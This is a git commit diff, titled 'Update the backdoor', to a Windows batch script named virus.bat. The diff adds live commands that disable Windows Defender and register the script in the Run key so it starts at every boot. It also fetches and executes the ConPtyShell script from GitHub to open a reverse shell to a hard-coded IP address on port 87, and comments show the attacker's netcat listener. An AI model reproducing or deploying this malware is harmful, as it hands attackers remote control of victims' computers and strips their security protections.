f47922cbfc7e682a16fd5050a3dfc81154d4fe0d
Kyryll <96183740+ASX320@users.noreply.github.com>
2023-12-04 15:52:44 +0100

    Update the backdoor

--- virus.bat
+++ virus.bat
@@ -12,19 +12,11 @@ if "%~dp0" neq "%newFolder%\" (
 
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "virus" /t REG_SZ /F /D "%newFolder%\virus.bat"
 
-::disabling defender
-:: PowerShell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 :: PowerShell -Command "Set-MpPreference -MAPSReporting 0"
-
-::possible solution
-::sc config WinDefend start= disabled
-::sc stop WinDefend
-
 :: PowerShell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"
-powershell.exe -ExecutionPolicy Bypass -Command "New-ItemProperty -Path “HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender” -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"
-
-::backdoor
-powershell.exe -ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell YOUR_SERVER_IP PORT"
+powershell -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
+powershell -ExecutionPolicy Bypass -Command "New-ItemProperty -Path “HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender” -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"
+powershell -ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.190.242.161 87"
 
 ::server: nc -lvnp 87
 ::server(tgt=win): stty raw -echo; (stty size; cat) | sudo nc -lvnp 87
